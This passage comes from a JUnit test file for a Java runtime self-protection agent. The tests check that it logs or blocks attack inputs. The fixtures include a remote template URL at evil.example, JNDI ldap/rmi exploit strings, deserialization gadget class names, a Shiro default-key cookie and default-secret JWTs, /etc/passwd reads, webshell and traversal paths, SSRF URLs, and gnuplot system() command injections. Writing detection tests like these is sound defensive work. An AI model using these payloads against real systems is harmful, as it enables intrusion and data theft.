
    assertFalse(Files.exists(log));
  }

  @Test
  void blocksRemoteTemplateSourceParameterWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-template-source-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeHttpRequest(
                new RequestStub(
                        "POST",
                        "/webtools/control/forgotPassword/StatsSinceStart",
                        "")
                    .withParameter(
                        "statsDecoratorLocation", "http://evil.example/ofbiz/payload.xml")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_template_source\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void blocksDefaultJwtSecretBearerTokenWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-default-jwt", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeHttpRequest(
                new RequestStub("GET", "/graphs", "")
                    .withHeader("Authorization", "Bearer " + HUGEGRAPH_DEFAULT_JWT)));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_default_jwt_secret\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("hugegraph-default-token-secret"));
    assertFalse(text.contains(HUGEGRAPH_DEFAULT_JWT));
  }

  @Test
  void blocksDefaultJwtSecretBearerTokenFromJaxRsRequestWhenBlockModeIsEnabled()
      throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-default-jwt-jaxrs", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeHttpRequest(
                new JaxRsRequestStub("GET", "http://127.0.0.1:8080/graphs?format=json")
                    .withHeader("Authorization", "Bearer " + HUGEGRAPH_DEFAULT_JWT)));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_default_jwt_secret\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("/graphs"));
    assertFalse(text.contains(HUGEGRAPH_DEFAULT_JWT));
  }

  @Test
  void ignoresBearerJwtWithUnknownSignature() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-default-jwt-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/graphs", "")
            .withHeader("Authorization", "Bearer " + HUGEGRAPH_TAMPERED_JWT));

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksJwtVerificationFailureContinuationWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jwt-verification-failure", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    Java17RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/de2api/user/info", "")
            .withHeader("X-DE-TOKEN", DATAEASE_WRONG_SIGNATURE_JWT));
    try {
      assertThrows(
          Java17RaspBlockException.class,
          () ->
              Java17RaspHooks.beforeJwtVerificationFailure(
                  DATAEASE_WRONG_SIGNATURE_JWT,
                  new com.auth0.jwt.exceptions.SignatureVerificationException("bad signature")));
    } finally {
      Java17RaspHooks.afterHttpRequest();
    }

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_jwt_verification_failure\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("source=X-DE-TOKEN"));
    assertTrue(text.contains("SignatureVerificationException"));
    assertFalse(text.contains(DATAEASE_WRONG_SIGNATURE_JWT));
  }

  @Test
  void ignoresJwtVerificationFailureWithoutRequestToken() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jwt-verification-quiet", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeHttpRequest(new RequestStub("GET", "/de2api/user/info", ""));
    try {
      Java17RaspHooks.beforeJwtVerificationFailure(
          DATAEASE_WRONG_SIGNATURE_JWT,
          new com.auth0.jwt.exceptions.SignatureVerificationException("bad signature"));
    } finally {
      Java17RaspHooks.afterHttpRequest();
    }

    assertFalse(Files.exists(log));
  }

  @Test
  void logsShiroDefaultRememberMeSerializedCookie() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-shiro-rememberme", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeHttpRequest(
        new RequestStub(
            "GET",
            "/",
            "",
            new CookieStub(
                "rememberMe", "AAECAwQFBgcICQoLDA0OD99XrYvceC/RUMm6dUki3C8=")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_default_crypto_cookie\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"cookie\":\"rememberMe shiro-default-aes-cbc\""));
    assertFalse(text.contains("AAECAwQFBgc"));
  }

  @Test
  void ignoresOrdinaryRememberMeCookie() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-shiro-rememberme-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/", "", new CookieStub("rememberMe", "ordinary-user-token")));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsFilesystemShapedJsessionid() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-session-file", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/", "", new CookieStub("JSESSIONID", ".deserialize")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_session_file_deserialization\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("hidden-file-session-id"));
  }

  @Test
  void ignoresOrdinaryJsessionidRouteSuffix() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-session-file-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/", "", new CookieStub("JSESSIONID", "abc123.node1")));

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksFilesystemShapedJsessionidWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-session-file-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeHttpRequest(
                new RequestStub("GET", "/", "", new CookieStub("JSESSIONID", ".deserialize"))));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_session_file_deserialization\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void blocksShiroDefaultRememberMeSerializedCookieWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-shiro-rememberme-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeHttpRequest(
                new RequestStub(
                    "GET",
                    "/",
                    "",
                    new CookieStub(
                        "rememberMe", "AAECAwQFBgcICQoLDA0OD99XrYvceC/RUMm6dUki3C8="))));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_default_crypto_cookie\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void logsSparkRestRemoteJobSubmission() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-spark-rest", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeSparkRestSubmit(sparkRestSubmissionBody());

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_remote_job_submission\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"hook\":\"SparkRest.handleSubmit\""));
  }

  @Test
  void blocksSparkRestRemoteJobSubmissionWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-spark-rest-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () -> Java17RaspHooks.beforeSparkRestSubmit(sparkRestSubmissionBody()));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_remote_job_submission\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void logsYarnResourceManagerApplicationSubmission() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-yarn-rest", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeYarnApplicationSubmit(yarnSubmission("touch /tmp/ohmyrasp-yarn-success"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_remote_job_submission\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"hook\":\"RMWebServices.submitApplication\""));
    assertTrue(text.contains("commands=1"));
    assertFalse(text.contains("touch /tmp/ohmyrasp-yarn-success"));
  }

  @Test
  void blocksYarnResourceManagerApplicationSubmissionWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-yarn-rest-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () -> Java17RaspHooks.beforeYarnApplicationSubmit(yarnSubmission("touch /tmp/ohmyrasp-yarn-block-success")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_request_remote_job_submission\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertFalse(text.contains("touch /tmp/ohmyrasp-yarn-block-success"));
  }

  @Test
  void ignoresLocalJndiLookup() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jndi-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeJndiLookup("java:comp/env/jdbc/app");

    assertFalse(Files.exists(log));
  }

  @Test
  void logsRemoteJndiLookup() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jndi-remote", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeJndiLookup("ldap://127.0.0.1:1389/Exploit");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_jndi_remote_lookup\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"lookup\":\"ldap://127.0.0.1:1389/Exploit\""));
  }

  @Test
  void blocksRemoteJndiLookupWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jndi-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () -> Java17RaspHooks.beforeJndiLookup("rmi://127.0.0.1:1099/Exploit"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_jndi_remote_lookup\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresNormalDeserializationClass() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-deser-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeObjectStreamClassResolve(ObjectStreamClass.lookup(String.class));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsDangerousDeserializationProxyInterface() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-deser-danger", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeObjectStreamProxyResolve(
        new String[] {"org.apache.commons.collections.functors.InvokerTransformer"});

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_deserialization_gadget_class\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"class\":\"org.apache.commons.collections.functors.InvokerTransformer\""));
  }

  @Test
  void logsBeanShellDeserializationGadgetClass() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-deser-beanshell", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeObjectStreamProxyResolve(new String[] {"bsh.XThis$Handler"});

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_deserialization_gadget_class\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"class\":\"bsh.XThis$Handler\""));
  }

  @Test
  void blocksDangerousDeserializationClassWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-deser-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeObjectStreamProxyResolve(
                new String[] {"com.sun.rowset.JdbcRowSetImpl"}));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_deserialization_gadget_class\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresNormalFileReadAndWrite() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-file-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeFileRead("/tmp/application-cache.txt");
    Java17RaspHooks.beforeFileWrite("/tmp/application-cache.txt");
    Java17RaspHooks.beforeNioFileRead("/tmp/application-cache.txt");
    Java17RaspHooks.beforeNioFileWrite("/tmp/application-cache.txt");
    Java17RaspHooks.beforeNioByteChannelOpen("/tmp/application-cache.txt", Arrays.asList("READ"));
    Java17RaspHooks.beforeNioByteChannelOpen("/tmp/application-cache.txt", Arrays.asList("WRITE"));
    Java17RaspHooks.beforeFileWrite(
        "/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/io/example/App.class");
    Java17RaspHooks.beforeFileWrite("/usr/local/tomcat/webapps/ROOT/WEB-INF/lib/app.jar");
    org.apache.catalina.startup.ExpandWar.writeJava17DeploymentFile(
        "/usr/local/tomcat/webapps/ROOT/index.jsp");
    org.apache.jasper.compiler.JDTCompiler.writeJava17JspCompilationFile(
        "/usr/local/tomcat/work/Catalina/localhost/ROOT/org/apache/jsp/index_jsp.class");
    io.netty.resolver.HostsFileEntriesProvider.ParserImpl.readJava17HostsFile("/etc/hosts");

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresTeamCityBundledPluginUnpackDuringStartup() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-teamcity-plugin", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    jetbrains.buildServer.web.impl.BuildServerConfigurator.invokeJava17BundledPluginUnpack(
        "/opt/teamcity/webapps/ROOT/WEB-INF/plugins/.unpacked/GitLabIssues/server/TeamCity.GitLabIssues-server-1.0-SNAPSHOT.jar");
    jetbrains.buildServer.web.impl.BuildServerConfigurator.invokeJava17PluginResourceUnpack(
        "/opt/teamcity/webapps/ROOT/plugins/artifactsSizeStatistics/suggestions/artifactsSizeDrop.jsp");

    assertFalse(Files.exists(log));
  }

  @Test
  void logsSensitiveFileRead() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-file-read", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeNioByteChannelOpen("/etc/passwd", Arrays.asList("READ"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_file_sensitive_read\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"path\":\"/etc/passwd\""));
  }

  @Test
  void logsWebrootScriptFileWrite() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-file-write", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeFileWrite("/tmp/webapps/ROOT/shell.jsp");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_file_script_write\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"path\":\"/tmp/webapps/ROOT/shell.jsp\""));
  }

  @Test
  void logsRelativeJavaWebappScriptFileWrite() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-file-relative-webapp-write", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeFileWrite("./applications/accounting/webapp/accounting/index.jsp");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_file_script_write\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(
        text.contains(
            "\"path\":\"./applications/accounting/webapp/accounting/index.jsp\""));
  }

  @Test
  void logsTraversalExecutableFileWrite() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-file-traversal-write", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeFileWrite("/tmp/flink-upload/../../tmp/evil.jar");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_file_script_write\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"path\":\"/tmp/flink-upload/../../tmp/evil.jar\""));
  }

  @Test
  void logsTeamCityPluginJarWriteOutsideStartupStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-teamcity-plugin-direct", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeFileWrite(
        "/opt/teamcity/webapps/ROOT/WEB-INF/plugins/.unpacked/evil/server/Evil.jar");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_file_script_write\""));
    assertTrue(text.contains("\"action\":\"log\""));
  }

  @Test
  void logsTeamCityPluginJspWriteOutsideStartupStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-teamcity-plugin-jsp-direct", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeFileWrite(
        "/opt/teamcity/webapps/ROOT/plugins/artifactsSizeStatistics/suggestions/artifactsSizeDrop.jsp");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_file_script_write\""));
    assertTrue(text.contains("\"action\":\"log\""));
  }

  @Test
  void blocksWebrootScriptFileWriteWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-file-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () -> Java17RaspHooks.beforeRandomAccessFileOpen("/tmp/webapps/ROOT/shell.jsp", "rw"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_file_script_write\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresNormalUrlOpen() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-url-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeUrlOpen(new URL("https://example.com/public/api"));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsCloudMetadataUrlOpen() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-url-metadata", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeUrlOpen(new URL("http://169.254.169.254/latest/meta-data/"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_ssrf_cloud_metadata\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"url\":\"http://169.254.169.254/latest/meta-data/\""));
  }

  @Test
  void blocksLoopbackAdminUrlWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-url-local-admin", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () -> Java17RaspHooks.beforeUrlOpen(new URL("http://127.0.0.1:8080/actuator/env")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_ssrf_loopback_admin\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresDataEaseApisixStartupProbe() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-dataease-apisix-startup", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    io.dataease.xpack.permissions.apisix.manage.XpackRouteManage.checkApisixUpstreams();

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksDataEaseApisixAdminUrlOutsideStartupStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-dataease-apisix-direct", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeUrlOpen(
                new URL("http://127.0.0.1:9180/apisix/admin/upstreams")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_ssrf_loopback_admin\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void blocksRequestParameterControlledUrlOpenWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-url-request-param", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    RequestStub request =
        new RequestStub("POST", "/geoserver/TestWfsPost", "")
            .withParameter("url", "http://attacker.example:18080/relay?x=1");
    Java17RaspHooks.beforeHttpRequest(request);
    try {
      assertThrows(
          Java17RaspBlockException.class,
          () -> Java17RaspHooks.beforeUrlOpen(new URL("http://attacker.example:18080/relay?x=1")));
    } finally {
      Java17RaspHooks.afterHttpRequest();
    }

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_ssrf_request_parameter_url\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("http://attacker.example:18080/relay?x=1"));
  }

  @Test
  void clearsRequestParameterControlledUrlsAfterHttpRequest() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-url-request-param-clear", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    RequestStub request =
        new RequestStub("POST", "/geoserver/TestWfsPost", "")
            .withParameter("url", "http://attacker.example:18080/relay");
    Java17RaspHooks.beforeHttpRequest(request);
    Java17RaspHooks.afterHttpRequest();
    Java17RaspHooks.beforeUrlOpen(new URL("http://attacker.example:18080/relay"));

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresSafeArchiveEntryFileWrite() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-archive-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.afterArchiveEntryName("safe/report.txt");
    Java17RaspHooks.beforeFileWrite("/tmp/archive/report.txt");

    assertFalse(Files.exists(log));
  }

  @Test
  void logsArchiveTraversalFileWrite() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-archive-traversal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.afterArchiveEntryName("../../webapps/ROOT/shell.jsp");
    Java17RaspHooks.beforeFileWrite("/tmp/extract/shell.jsp");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_archive_entry_traversal_write\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("../../webapps/ROOT/shell.jsp -> /tmp/extract/shell.jsp"));
  }

  @Test
  void ignoresSafeGeneratedPlotScriptWrite() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-plot-script-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    byte[] content = "set yrange [0:42]\nplot '-' using 1:2".getBytes(StandardCharsets.UTF_8);
    Java17RaspHooks.beforeFileWrite("/tmp/opentsdb/safe.gnuplot");
    Java17RaspHooks.beforeFileContentWrite(content, 0, content.length);

    assertFalse(Files.exists(log));
  }

  @Test
  void logsGeneratedPlotScriptCommandWrite() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-plot-script-command", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    byte[] content =
        "set yrange [0:system('touch /tmp/ohmyrasp-opentsdb-success')]\nplot '-' using 1:2"
            .getBytes(StandardCharsets.UTF_8);
    Java17RaspHooks.beforeFileWrite("/tmp/opentsdb/evil.gnuplot");
    Java17RaspHooks.beforeFileContentWrite(content, 0, content.length);

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_file_generated_plot_script_command\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"path\":\"/tmp/opentsdb/evil.gnuplot\""));
  }

  @Test
  void blocksGeneratedPlotScriptCommandWriteWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-plot-script-command-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    byte[] content =
        "set key ;system \"touch /tmp/ohmyrasp-opentsdb-success\" \"\"\nplot '-' using 1:2"
            .getBytes(StandardCharsets.UTF_8);
    Java17RaspHooks.beforeFileWrite("/tmp/opentsdb/evil.gnuplot");

    assertThrows(
        Java17RaspBlockException.class,
        () -> Java17RaspHooks.beforeFileContentWrite(content, 0, content.length));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_file_generated_plot_script_command\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void rewritesSevenZipArchiveEntryPathGetter() throws Exception {
    byte[] transformed =
        new Java17ArchiveTransformer()
            .transform(
                null,
                "net/sf/sevenzipjbinding/simple/impl/SimpleInArchiveItemImpl",
                null,
                null,
                classBytes(net.sf.sevenzipjbinding.simple.impl.SimpleInArchiveItemImpl.class));

    assertTrue(transformed != null && transformed.length > 0);
  }

  @Test
  void blocksArchiveTraversalFileWriteWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-archive-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    Java17RaspHooks.afterArchiveEntryName("/WEB-INF/web.xml");

    assertThrows(
        Java17RaspBlockException.class,
        () -> Java17RaspHooks.beforeFileWrite("/tmp/extract/WEB-INF/web.xml"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_archive_entry_traversal_write\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresNormalJdbcUrl() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jdbc-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeJdbcConnection("jdbc:h2:mem:application");
    Java17RaspHooks.beforeJdbcConnection("jdbc:mysql://localhost/app?useSSL=false");

    assertFalse(Files.exists(log));
  }

  @Test
  void logsH2JdbcCodeExecutionUrl() throws Exception {
